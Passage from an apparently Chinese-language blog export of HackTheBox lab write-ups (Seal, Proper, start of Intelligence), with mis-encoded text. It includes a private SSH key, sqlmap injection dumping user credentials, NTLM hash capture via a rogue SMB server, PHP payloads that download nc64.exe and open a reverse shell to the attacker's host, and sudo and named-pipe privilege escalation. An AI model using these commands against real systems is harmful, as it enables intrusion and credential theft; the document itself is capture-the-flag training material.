cCYablLjUCOq05aPVqhaW6tyDaf8ob85q\n/s+CYaOrbi1YhxhOM8o5MvNzsrS8eIk1hTOf0msKEJ5mWo+RfhhCj9FTFSqyK79hQBAAAA\nwQCfhc5si+UU+SHfQBg9lm8d1YAfnXDP5X1wjz+GFw15lGbg1x4YBgIz0A8PijpXeVthz2\nib+73vdNZgUD9t2B0TiwogMs2UlxuTguWivb9JxAZdbzr8Ro1XBCU6wtzQb4e22licifaa\nWS/o1mRHOOP90jfpPOby8WZnDuLm4+IBzvcHFQaO7LUG2oPEwTl0ii7SmaXdahdCfQwkN5\nNkfLXfUqg41nDOfLyRCqNAXu+pEbp8UIUl2tptCJo/zDzVsI4AAADBAOUwZjaZm6w/EGP6\nKX6w28Y/sa/0hPhLJvcuZbOrgMj+8FlSceVznA3gAuClJNNn0jPZ0RMWUB978eu4J3se5O\nplVaLGrzT88K0nQbvM3KhcBjsOxCpuwxUlTrJi6+i9WyPENovEWU5c79WJsTKjIpMOmEbM\nkCbtTRbHtuKwuSe8OWMTF2+Bmt0nMQc9IRD1II2TxNDLNGVqbq4fhBEW4co1X076CUGDnx\n5K5HCjel95b+9H2ZXnW9LeLd8G7oFRUQAAAMEAyHfDZKku36IYmNeDEEcCUrO9Nl0Nle7b\nVd3EJug4Wsl/n1UqCCABQjhWpWA3oniOXwmbAsvFiox5EdBYzr6vsWmeleOQTRuJCbw6lc\nYG6tmwVeTbhkycXMbEVeIsG0a42Yj1ywrq5GyXKYaFr3DnDITcqLbdxIIEdH1vrRjYynVM\nueX7aq9pIXhcGT6M9CGUJjyEkvOrx+HRD4TKu0lGcO3LVANGPqSfks4r5Ea4LiZ4Q4YnOJ\nu8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=\n-----END OPENSSH PRIVATE KEY-----\n```\nå’±ä»¬ä¿å­˜åˆ°æœ¬åœ°ï¼Œä½¿ç”¨sshè¿›è¡Œç™»å½•\n\n```Plain Text\nchmod 600 id_rsa\nssh luis@10.10.10.250 -i id_rsa\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# ssh luis@10.10.10.250 -i id_rsa\nWelcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Mon 12 Jul 2021 09:00:29 AM UTC\n\n  System load:           0.04\n  Usage of /:            46.4% of 9.58GB\n  Memory usage:          19%\n  Swap usage:            0%\n  Processes:             183\n  Users logged in:       0\n  IPv4 address for eth0: 10.10.10.250\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:af64\n\n0 updates can be applied immediately.\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\nLast login: Fri May  7 07:00:18 2021 from 10.10.14.2\nluis@seal:~$\n```\næˆåŠŸè·å¾—useræƒé™\n\n```Plain Text\nluis@seal:~$ cat user.txt\ne2f0032d0a9f2ec1d750505f6789b8e2\n```\næˆåŠŸæ‹¿åˆ°useræƒé™çš„flag ## æƒé™æå‡\n\n```Plain Text\nluis@seal:~$ sudo -l\nMatching Defaults entries for luis on seal:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser luis may run the following commands on seal:\n    (ALL) NOPASSWD: /usr/bin/ansible-playbook *\n```\nä½¿ç”¨sudo -læŸ¥çœ‹sudoæƒé™åå‘ç°ï¼Œå’±ä»¬å¯ä»¥ä»¥rootæƒé™æ‰§è¡Œ`ansible-playebook`\n\n> å‚è€ƒèµ„æ–™  https://docs.ansible.com/ansible/latest/user/guide/playbooks.html\n\nåˆ›å»ºä¸€ä¸ªåä¸ºroot.ymlçš„æ–‡ä»¶\n\n```Plain Text\n- name: Ansible Copy Example Local to Remote\n  hosts: localhost\n  tasks:\n    - name: copying file with playbook\n      become: true\n      copy:\n        src: /root/root.txt\n        dest: /dev/shm\n        owner: luis\n        group: luis\n        mode: 0777\n```\nä½¿ç”¨sudo /usr/bin/ansible-playbookæ‰§è¡Œroot.ymlæ–‡ä»¶\n\n```Plain Text\nluis@seal:/dev/shm$ sudo /usr/bin/ansible-playbook root.yml\n[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'\n\nPLAY [Ansible Copy Example Local to Remote] **********************************************************************************************************************************************************************\n\nTASK [Gathering Facts] *******************************************************************************************************************************************************************************************\nok: [localhost]\n\nTASK [copying file with playbook] ********************************************************************************************************************************************************************************\nchanged: [localhost]\n\nPLAY RECAP *******************************************************************************************************************************************************************************************************\nlocalhost                  : ok=2    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0\n```\n```Plain Text\nluis@seal:/dev/shm$ ls\npasswd  root.txt  root.yml\nluis@seal:/dev/shm$ cat root.txt\na18fdff4cccc7a1b0ef961fa8f007756\n```\næˆåŠŸè·å¾—rootæƒé™çš„flag","tags":["Hackthebox"]},{"title":"Proper - Hackthebox","url":"/2021/07/11/Hackthebox/Hard/Hackthebox-Proper/","content":"\n# Hackthebox - Proper\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Proper/image1.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Proper/image2.png)\n\n## ä¿¡æ¯æœé›† é¦–å…ˆä½¿ç”¨Nmapè¿›è¡Œä¿¡æ¯æœé›†\n```Plain Text\nnmap -A -sS -sC -sV -p- 10.10.10.231\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# nmap -A -sS -sC -sV -p- 10.10.10.231\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-07-10 13:09 CST\nNmap scan report for 10.10.10.231\nHost is up (0.24s latency).\nNot shown: 65534 filtered ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Microsoft IIS httpd 10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: OS Tidy Inc.\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\nNo OS matches for host\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   240.14 ms 10.10.14.1\n2   240.16 ms 10.10.10.231\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 389.51 seconds\n```\nä»nmapæ‰«ææˆ‘ä»¬å¯ä»¥å¾—åˆ°çš„ä¿¡æ¯æœ‰ - æœ¬å°é¶æœºå¼€å¯äº†80ç«¯å£ - æœ¬å°é¶æœºä½¿ç”¨äº†IIS 10.0ä½œä¸ºWebæœåŠ¡å™¨ - æœ¬å°é¶æœºæ˜¯Windowsç³»ç»Ÿ\n\nè¿™å°é¶æœºåªå¼€å¯äº†80ç«¯å£ï¼Œé‚£è¿™åº”è¯¥å°±æ˜¯æˆ‘ä»¬å”¯ä¸€çš„çªç ´å£äº†ï¼Œè®©æˆ‘ä»¬å…ˆæ¥è®¿é—®ä¸€ä¸‹çœ‹çœ‹å§\n\nåœ¨ä¸»é¡µé¢æˆ‘ä»¬æ²¡å‘ç°ä»€ä¹ˆæœ‰è¶£çš„ä¸œè¥¿ï¼Œé‚£å°±å…ˆFUZZä¸€ä¸‹ç›®å½•çœ‹çœ‹å§\n\n```Plain Text\ngobuster dir -u http://10.10.10.231/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# gobuster dir -u http://10.10.10.231/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 200\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.231/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              php,html,txt\n[+] Timeout:                 10s\n===============================================================\n2021/07/10 14:01:21 Starting gobuster in directory enumeration mode\n===============================================================\n/Index.html           (Status: 200) [Size: 14257]\n/assets               (Status: 301) [Size: 150] [--> http://10.10.10.231/assets/]\n/functions.php        (Status: 200) [Size: 0]\n/index.html           (Status: 200) [Size: 14257]\n/index.html           (Status: 200) [Size: 14257]\n/licenses             (Status: 301) [Size: 152] [--> http://10.10.10.231/licenses/]\n\n===============================================================\n2021/07/10 14:01:46 Finished\n===============================================================\n```\næˆ‘ä»¬å‘ç°äº†ä¸¤ä¸ªç›®å½•`assets`ã€`licenses`å’Œä¸€ä¸ªæ–‡ä»¶`functions.php`\n\nå’±ä»¬æŠŠè¿™ä¸¤ä¸ªç›®å½•ç»§ç»­fuzzï¼Œç„¶åå»çœ‹çœ‹è¿™ä¸ªphpæ–‡ä»¶é‡Œæœ‰ä»€ä¹ˆ\n\n```Plain Text\nhttp://10.10.10.231/\n    index.php\n    functions.php\n    /assets\n        /api\n        /css\n        /fonts\n        /img\n        /js\n    /licenses\n        index.php\n        logout.php\n        licenses.php\n```\nè®¿é—®åå‘ç°ï¼Œ`functions.php`æ˜¯ç©ºç™½é¡µé¢ï¼Œæ²¡æœ‰å¯è®¿é—®çš„å†…å®¹ã€‚è®¿é—®`/assets`å’Œ`/assets/api`éƒ½æ˜¯è¿”å›404ï¼Œæš‚æ—¶æ— æ³•è®¿é—®ã€‚è€Œè®¿é—®`/licenses`åï¼Œæ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œè®¿é—®`/licenses/licenses.php`ä¼šè·³è½¬åˆ°`/licenses/index.php`é¡µé¢\n\nåœ¨`http://10.10.10.231/index.php`ç½‘é¡µæºä»£ç çš„æ—¶å€™ï¼Œæ‰¾åˆ°äº†ä¸¤ä¸ªæœ‰æ„æ€çš„ä¸œè¥¿\n\n![](Hackthebox-Proper/image3.png)\n\nå››ä¸ªç”¨æˆ·å - dustin - daksh - anna - wafer\n\n![](Hackthebox-Proper/image4.png)\n\nä¸€æ®µURLï¼Œå’±ä»¬è®¿é—®ä¸€ä¸‹è¯•è¯•\n\n```Plain Text\nhttp://10.10.10.231/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b\n```\nè®¿é—®åå‘ç°æ˜¯index.phpé¡µé¢çš„å•†åº—åŠŸèƒ½\n\næµ‹è¯•åå‘ç°ï¼Œä¸Šè¿°urlä¸­ï¼Œç¼ºå°‘äº†orderæˆ–è€…hè¿™ä¸¤ä¸ªä»»æ„ä¸€ä¸ªå‚æ•°ï¼Œéƒ½ä¼šå¾—åˆ°å¦‚ä¸‹æŠ¥é”™\n\næˆ‘æœ‰ç‚¹å¥½å¥‡è¿™æ®µhashçš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Œå’±ä»¬ä½¿ç”¨johnç»™å®ƒè§£å¯†ä¸€ä¸‹\n\næµ‹è¯•å¾—åˆ°HASHç®—æ³•\n\n```Plain Text\nHash = md5(Salt+Payload)\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# john hash --wordlist=/usr/share/wordlists/rockyou.txt\nWarning: detected hash type \"LM\", but the string is also recognized as \"dynamic=md5($p)\"\nUse the \"--format=dynamic=md5($p)\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"HAVAL-128-4\"\nUse the \"--format=HAVAL-128-4\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"MD2\"\nUse the \"--format=MD2\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"mdc2\"\nUse the \"--format=mdc2\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"mscash\"\nUse the \"--format=mscash\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"mscash2\"\nUse the \"--format=mscash2\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"NT\"\nUse the \"--format=NT\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"Raw-MD4\"\nUse the \"--format=Raw-MD4\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"Raw-MD5\"\nUse the \"--format=Raw-MD5\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"Raw-MD5u\"\nUse the \"--format=Raw-MD5u\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"Raw-SHA1-AxCrypt\"\nUse the \"--format=Raw-SHA1-AxCrypt\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"ripemd-128\"\nUse the \"--format=ripemd-128\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"Snefru-128\"\nUse the \"--format=Snefru-128\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"ZipMonster\"\nUse the \"--format=ZipMonster\" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nUsing default target encoding: CP850\nLoaded 2 password hashes with no different salts (LM [DES 256/256 AVX2])\nWarning: poor OpenMP scalability for this hash type, consider --fork=2\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:00:01 DONE (2021-07-10 14:44) 0g/s 9808Kp/s 9808Kc/s 19617KC/s !!LIVER..*7Â¡VA\nSession completed\n```\nçœ‹åˆ°è¿™é‡Œï¼Œçªç„¶å°±æƒ³é€šä¸ºä»€ä¹ˆä¼šæŠŠè¿™æ®µhashæ’å…¥åˆ°orderé‡Œäº†\n\n## æ¼æ´åˆ©ç”¨\nä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæ³¨å…¥\n\n```Plain Text\nsqlmap -u \"http://10.10.10.231/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b\" --eval=\"import hashlib ; h=hashlib.md5(('hie0shah6ooNoim'+order).encode('utf-8')).hexdigest()\"  --batch --threads=10 -D cleaner -T customers -C id,login,password --dump\n```\nå¾—åˆ°äº†ç»“æœ\n\n```Plain Text\n+----+------------------------------+----------------------------------------------+\n| id | login                        | password                                     |\n+----+------------------------------+----------------------------------------------+\n| 1  | vikki.solomon@throwaway.mail | 7c6a180b36896a0a8c02787eeafb0e4c (password1) |\n| 2  | nstone@trashbin.mail         | 6cb75f652a9b52798eb6cf2201057c73 (password2) |\n| 3  | bmceachern7@discovery.moc    | e10adc3949ba59abbe56e057f20f883e (123456)    |\n| 4  | jkleiser8@google.com.xy      | 827ccb0eea8a706c4c34a16891f84e7b (12345)     |\n| 5  | mchasemore9@sitemeter.moc    | 25f9e794323b453885f5181f1b624d0b (123456789) |\n| 6  | gdornina@marriott.moc        | 5f4dcc3b5aa765d61d8327deb882cf99 (password)  |\n| 7  | itootellb@forbes.moc         | f25a2fc72690b780b2a14e140ef6a9e0 (iloveyou)  |\n| 8  | kmanghamc@state.tx.su        | 8afa847f50a716e64932d995c8e7435a (princess)  |\n| 9  | jblinded@bing.moc            | fcea920f7412b5da7be0cf42b8c93759 (1234567)   |\n| 10 | llenchenkoe@macromedia.moc   | f806fc5a2a0d5ba2471600758452799c (rockyou)   |\n| 11 | aaustinf@booking.moc         | 25d55ad283aa400af464c76d713c07ad (12345678)  |\n| 12 | afeldmesserg@ameblo.pj       | e99a18c428cb38d5f260853678922e03 (abc123)    |\n| 13 | ahuntarh@seattletimes.moc    | fc63f87c08d505264caba37514cd0cfd (nicole)    |\n| 14 | talelsandrovichi@tamu.ude    | aa47f8215c6f30a0dcdb2a36a9f4168e (daniel)    |\n| 15 | ishayj@dmoz.gro              | 67881381dbc68d4761230131ae0008f7 (babygirl)  |\n| 16 | acallabyk@un.gro             | d0763edaa9d9bd2a9516280e9044d885 (monkey)    |\n| 17 | daeryl@about.you             | 061fba5bdfc076bb7362616668de87c8 (lovely)    |\n| 18 | aalekseicikm@skyrock.moc     | aae039d6aa239cfc121357a825210fa3 (jessica)   |\n| 19 | lginmann@lycos.moc           | c33367701511b4f6020ec61ded352059 (654321)    |\n| 20 | lgiorioo@ow.lic              | 0acf4539a14b3aa27deeb4cbdf6e989f (michael)   |\n| 21 | lbyshp@wired.moc             | adff44c5102fca279fce7559abf66fee (ashley)    |\n| 22 | bklewerq@yelp.moc            | d8578edf8458ce06fbc5bb76a58c5ca4 (qwerty)    |\n| 23 | wstrettellr@senate.gov       | 96e79218965eb72c92a549dd5a330112 (111111)    |\n| 24 | lodorans@kickstarter.moc     | edbd0effac3fcc98e725920a512881e0 (iloveu)    |\n| 25 | bpfeffelt@artisteer.moc      | 670b14728ad9902aecba32e22fa4f6bd (000000)    |\n| 26 | lgrimsdellu@abc.net.uvw      | 2345f10bb948c5665ef91f6773b3e455 (michelle)  |\n| 27 | lpealingv@goo.goo            | f78f2477e949bee2d12a2c540fb6084f (tigger)    |\n| 28 | krussenw@mit.ude             | 0571749e2ac330a7455809c6b0e7af90 (sunshine)  |\n| 29 | meastmondx@businessweek.moc  | c378985d629e99a4e86213db0cd5e70d (chocolate) |\n+----+------------------------------+----------------------------------------------+\n```\néšä¾¿é€‰æ‹©ä¸€ä¸ªè´¦å·è¿›è¡Œç™»å½•\n\n![](Hackthebox-Proper/image5.png)\n\nç™»å…¥åï¼Œåœ¨æºç å¤„å‘ç°äº†æœ‰è¶£çš„ä¸œè¥¿\n\nå’±ä»¬æŠŠthemeæ›´æ”¹ä¸º`..`å¹¶ç”Ÿæˆç›¸å¯¹åº”çš„hashå€¼\n\n```Plain Text\nhttp://10.10.10.231/licenses/licenses.php?theme=..&h=c5427f8e0865273f4a62c614adec0985\n```\nhashç”Ÿæˆè„šæœ¬\n\n```Plain Text\nimport hashlib\n\nm = hashlib.md5()\n# b\"hie0shah6ooNoimåè¾¹çš„`..`å°±æ˜¯æˆ‘ä»¬çš„è‡ªå®šä¹‰payload\nm.update(b\"hie0shah6ooNoim..\")\n\nprint(m.hexdigest())\n```\nå‘ç°æ³¨é‡Šé‡Œæœ‰ä¸€äº›æè¿°\n\nå’±ä»¬å°è¯•ä¸€ä¸‹`RFI(Remote File Inclusion è¿œç¨‹æ–‡ä»¶åŒ…å«)`\n\nä½¿ç”¨pythonè‡ªå¸¦çš„`smbserver.py`æ¨¡å—å¼€å¯ä¸€ä¸ªè™šå‡çš„smbæœåŠ¡\n\n```Plain Text\npython3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 10.10.14.24 -smb2support evil .\n```\n```Plain Text\nhttp://10.10.10.231/licenses/licenses.php?theme=//10.10.14.24&h=288af3998fba7f4c3fd8e58be73b26ae\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# python3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 10.10.14.24 -smb2support evil .\nImpacket v0.9.21 - Copyright 2020 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n[*] Incoming connection (10.10.10.231,51415)\n[*] AUTHENTICATE_MESSAGE (PROPER\\web,PROPER)\n[*] User PROPER\\web authenticated successfully\n[*] web::PROPER:4141414141414141:e73cd0da1ecd6a53908ce1117b61d53c:010100000000000000379e157675d70156bee2cc93aced8e000000000100100054006e00520063006e006a006e0063000300100054006e00520063006e006a006e0063000200100055004500650052004a004e006f004f000400100055004500650052004a004e006f004f000700080000379e157675d70106000400020000000800300030000000000000000000000000200000cc94dbb5a4a8ccad357314b70a1060b2abd390224562589501139c5005a818470a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320034000000000000000000\n[*] Handle: 'ConnectionResetError' object is not subscriptable\n[*] Closing down connection (10.10.10.231,51415)\n[*] Remaining connections []\n```\næˆåŠŸè·å–åˆ°ä¸€ä¸ªhashï¼Œå’±ä»¬ä¸¢åˆ°johné‡Œè¿›è¡Œç ´è§£\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# john --show --format=netntlmv2 hash\nweb:charlotte123!:PROPER:4141414141414141:e73cd0da1ecd6a53908ce1117b61d53c:010100000000000000379e157675d70156bee2cc93aced8e000000000100100054006e00520063006e006a006e0063000300100054006e00520063006e006a006e0063000200100055004500650052004a004e006f004f000400100055004500650052004a004e006f004f000700080000379e157675d70106000400020000000800300030000000000000000000000000200000cc94dbb5a4a8ccad357314b70a1060b2abd390224562589501139c5005a818470a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320034000000000000000000\n\n1 password hash cracked, 0 left\n```\næˆåŠŸè·å¾—äº†ä¸€ä¸ªè´¦æˆ·å¯†ç \n\n```Plain Text\nusername = web\npassword = charlotte123!\n```\nä½¿ç”¨è´¦å·å¯†ç é‡æ–°æ‰§è¡ŒsmbæœåŠ¡\n\n```Plain Text\npython3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 10.10.14.24 -username web -password charlotte123! -smb2support eval .\n```\nåœ¨æœ¬åœ°ç¼–å†™ä¸€ä¸ªæ¡ä»¶ç«äº‰çš„shè„šæœ¬ï¼Œä¿å­˜ä¸º`race.sh`\n\n```Plain Text\n#!/bin/bash\nPAYLOAD=$1\nwhile :; do\n    echo hello world > header.inc\n    echo \"$PAYLOAD\" > header.inc\ndone\n```\nç„¶åè¿è¡Œè„šæœ¬\n\n```Plain Text\n./race.sh '<?php phpinfo(); ?>'\n```\nç„¶åå†æ¬¡è¯·æ±‚ç½‘é¡µ\n\n```Plain Text\nhttp://10.10.10.231/licenses/licenses.php?theme=//10.10.14.24/evil&h=d1a79488ed1966002feef92cabc0ccc8\n```\næˆåŠŸè¿”å›äº†phpinfoç•Œé¢\n\n![](Hackthebox-Proper/image6.png)\n\nå¯èƒ½ä¸€æ¬¡ä¸è¡Œï¼Œå¤šåˆ·æ–°å‡ æ¬¡\n\nç°åœ¨å’±ä»¬åœ¨æœ¬åœ°æ”¾ä¸€ä¸ª`netcat.exe`ï¼Œä¸Šä¼ åˆ°é¶æœºé‡Œæ¥åå¼¹shell\n\né¦–å…ˆä½¿ç”¨Python3åœ¨æœ¬åœ°å¼€å¯ä¸€ä¸ªhttpæœåŠ¡å™¨\n\n```Plain Text\npython3 -m http.server 80\n```\nç„¶åè¿è¡Œè„šæœ¬\n\n```Plain Text\n./race.sh '<?php system(\"cmd /c powershell iwr http://10.10.14.24/nc64.exe -outf \\windows\\system32\\spool\\drivers\\color\\cute.exe\"); ?>'\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 5555 (http://0.0.0.0:5555/) ...\n10.10.10.231 - - [11/Jul/2021 09:06:05] \"GET /nc64.exe HTTP/1.1\" 200 -\n```\næ¥æ”¶åˆ°GETè¯·æ±‚å°±æ˜¯æ‰§è¡ŒæˆåŠŸäº†ï¼Œç°åœ¨æˆ‘ä»¬ä½¿ç”¨ncåœ¨æœ¬åœ°ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```Plain Text\nnc -nvlp 4444\n```\nç„¶ååˆ©ç”¨æˆ‘ä»¬åˆšæ‰ä¸Šä¼ çš„nc64.exeæ¥åå¼¹shell\n\n```Plain Text\n./race.sh '<?php system(\"cmd /c start \\windows\\system32\\spool\\drivers\\color\\cute.exe 10.10.14.24 4444 -e cmd.exe\"); ?>'\n```\n![](Hackthebox-Proper/image7.png)\n\næˆåŠŸå¼¹å›shell\n\n```Plain Text\nc:\\Users\\web\\Desktop>type user.txt\ntype user.txt\n48129e580da3dc57a121551b897d1f5a\n```\næˆåŠŸæ‹¿åˆ°useræƒé™çš„flag ## æƒé™æå‡ è¿›å…¥\n\n```Plain Text\nc:\\Program Files\\Cleanup>dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is FE0C-A36B\n\n Directory of c:\\Program Files\\Cleanup\n\n11/15/2020  05:05 AM    <DIR>          .\n11/15/2020  05:05 AM    <DIR>          ..\n11/15/2020  05:03 AM         2,999,808 client.exe\n11/15/2020  10:22 AM               174 README.md\n11/15/2020  06:20 AM         3,041,792 server.exe\n               3 File(s)      6,041,774 bytes\n               2 Dir(s)   7,353,192,448 bytes free\n```\næˆ‘åœ¨C:Files`client.exe`å’Œ`server.exe`\n\nè¿™å°±æ˜¯å’±ä»¬ææƒçš„çªç ´å£äº†\n\n```Plain Text\nmklink /j \\users\\web\\downloads\\lucifiel \\users\\administrator\\desktop\n```\nå…ˆåšä¸€ä¸ªé“¾æ¥\n\næ“æ§ç®¡é“`\\\\.\\pipe\\cleanuppipe`\n\n```Plain Text\necho CLEAN \\users\\web\\downloads\\lucifiel\\root.txtx > \\\\.\\pipe\\cleanuppipe\n```\næ­¤æ—¶Server.exeä¼šé€šè¿‡ç®¡é“çš„å†…å®¹æ¥è¿è¡Œç¨‹åº, ä¼šå°†ç¨‹åºåŠ å¯†å¹¶ç§»åŠ¨è‡³`\\programdata\\cleanup`(è¿™ä¸ªç¨‹åºåº”è¯¥æ˜¯administratorè¿è¡Œçš„)\n\nåˆ æ‰é“¾æ¥, åˆ›å»ºæ–‡ä»¶å¤¹, å†è¿˜åŸæ–‡ä»¶\n\n```Plain Text\nrmdir \\users\\web\\downloads\\lucifiel\nmkdir \\users\\web\\downloads\\lucifiel\necho RESTORE \\users\\web\\downloads\\lucifiel\\root.txtx > \\\\.\\pipe\\cleanuppipe\ntype \\users\\web\\downloads\\lucifiel\\root.txt\n\n9b07cf2c755f11c5545475416fb3a74f\n```\næˆåŠŸè·å¾—rootæƒé™çš„flag\n\nPSï¼šé€†å‘è¿™å—å„¿æˆ‘ä¸ä¼šï¼Œæˆ‘ç›´æ¥æŠ„çš„ç­”æ¡ˆ\n\nä¸‹é¢è´´ä¸Šæˆ‘æŠ„çš„ç­”æ¡ˆçš„åŸæ–‡\n\n### Analysis of client.exe\nReverse engineering of client.exe shows the need to supply an argument in order to â€œmake it do somethingâ€.\n\n![](Hackthebox-Proper/image8.png)\n\nYou can see from above that by supplying a -R and a file path triggers the main\\_serviceRestore function which in turn calls upon a named pipe client to connect to a named pipe, cleanupPipe.\n\n![](Hackthebox-Proper/image9.png)\n\nFurther down the control flow graph, this is whatâ€™s actually sent across the named pipe.\n\n![](Hackthebox-Proper/image10.png)\n\n### Analysis of server.exe Suppose we replicate the behaviors of client.exe and server.exe in a Windows 10 installation. This is what we have determined above\n![](Hackthebox-Proper/image11.png)\n\nThis is whatâ€™s displayed in server.exe.\n\n![](Hackthebox-Proper/image12.png)\n\nHmm, where have I seen C:before? By the way, dGVzdA== is the base64-encoded string of test. On top of that, this is evidence that a named pipe, cleanupPipe is listening for data.\n\n![](Hackthebox-Proper/image13.png)\n\nWe can send our own data to server.exe with good olâ€™ command prompt using the echo command like so.\n\n![](Hackthebox-Proper/image14.png)\n\nMeanwhile in server.exe, I see thisâ€¦\n\n![](Hackthebox-Proper/image15.png)\n\nSomethingâ€™s not right. One character is truncated. In any case, all I have to do is to add one more character behind the path. Well, this is what happened. CLEAN removes the file specified in the file path and move it to C: and its content encrypted with AES-GCM.\n\n![](Hackthebox-Proper/image16.png)\n\nConversely, RESTORE restores the file back to the original file path by decrypting the file contents and decoding the file path.","tags":["Hackthebox"]},{"title":"Intelligence - Hackthebox","url":"/2021/07/07/Hackthebox/Medium/Hackthebox-Intelligence/","content":"\n# Hackthebox - Intelligence\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Intelligence/0fbbe52d-ffed-4a1d-9efd-c4a3e05dfdae.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Intelligence/f802a0be-11ff-4a50-a09e-e245361bf800.png)\n\n## ä¿¡æ¯æœé›† \n\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# nmap -A -sS -sC -sV -p- 10.10.10.248\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 09:27 CST\nNmap scan report for 10.10.10.248\nHost is up (0.24s latency).\nNot shown: 65515 filtered ports\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Intelligence\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-07 08:49:30Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc.intelligence.htb\n| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb\n| Not valid before: 2021-04-19T00:43:16\n|_Not valid after:  2022-04-19T00:43:16\n|_ssl-date: 2021-07-07T08:51:09+00:00; +7h12m23s from scanner time.\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows 